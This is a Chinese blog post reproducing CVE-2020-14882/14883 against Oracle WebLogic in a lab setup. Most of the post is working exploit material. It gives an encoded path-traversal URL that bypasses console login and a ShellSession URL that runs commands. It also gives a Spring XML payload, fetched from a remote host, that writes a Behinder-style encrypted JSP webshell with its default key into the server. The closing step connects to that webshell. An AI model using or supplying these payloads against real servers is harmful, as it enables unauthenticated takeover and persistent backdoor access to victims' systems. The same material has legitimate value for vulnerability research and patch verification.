# CVE-2020-14882：weblogic 未授权命令执行 - 徐野子 - 博客园

> 原文：[`www.cnblogs.com/XuyeZi/p/14723721.html`](https://www.cnblogs.com/XuyeZi/p/14723721.html)

## 漏洞简介

远程代码执行漏洞 （CVE-2020-14882）POC 已被公开，未经身份验证的远程攻击者可通过构造特殊的 HTTP GET 请求，结合 CVE-2020-14883 漏洞进行利用，利用此漏洞可在未经身份验证的情况下直接接管 WebLogic Server Console ，并执行任意代码，利用门槛低，危害巨大。

## 影响版本

Oracle WebLogic Server，版本 10.3.6.0，12.1.3.0，12.2.1.3，12.2.1.4，14.1.1.0。

## 环境搭建

### 0x01weblogic 安装

```
java -jar fmw_12.2.1.4.0_wls_lite_generic.jar 
```

![](img/db16e5e1584984a60f7ca2c3eb7a1f97.png)

### 0x02 创建域

![](img/fa873ccde7f0decbab0dff1cf7b207ea.png)
![](img/59c6def41700dacc6ddf4413b77a02de.png)

### 0x03 启动 weblogic

输入创建域时的用户名和密码启动服务
![](img/3ba3d03920af20b3275e63b7aba4de64.png)

进入 console 页面
![](img/d9674e814a7cfb43ef3c2c80c267a315.png)

## 漏洞利用

### 0x01 越权

URL 加入 payload，可以直接进入后台

```
http://192.168.1.131:7001/console/images/%252E%252E%252Fconsole.portal
?_nfpb=true
&_pageLabel=AppDeploymentsControlPage
&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29 
```

![](img/be490d83c9c4d23356a5a0604ed1f13f.png)

### 0x02 命令执行

例如弹出记事本

```
http://192.168.1.131:7001/console/images/%252E%252E%252Fconsole.portal
?_nfpb=true
&_pageLabel=HomePage1
&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27notepad.exe%27);%22) 
```

![](img/d24141c71fd09687eb95371b567d562c.png)
通过`FileSystemXmlApplicationContext()`载并执行远端 xml 文件：

```
<beans   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[echo "<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码 32 位 md5 值的前 16 位，默认连接密码 rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>"
		> "../../../wlserver/server/lib/consoleapp/webapp/images/shell.jsp"]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans> 
```

将 poc.xml 放入远端 web 服务器
![](img/0ba06971332c55d91a2c0ce59494394b.png)
执行 payload

```
http://192.168.1.131:7001/console/images/%252E%252E%252Fconsole.portal
?_nfpb=true
&_pageLabel=
&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.1.7/poc.xml") 
```

打开冰蝎，连接 webshell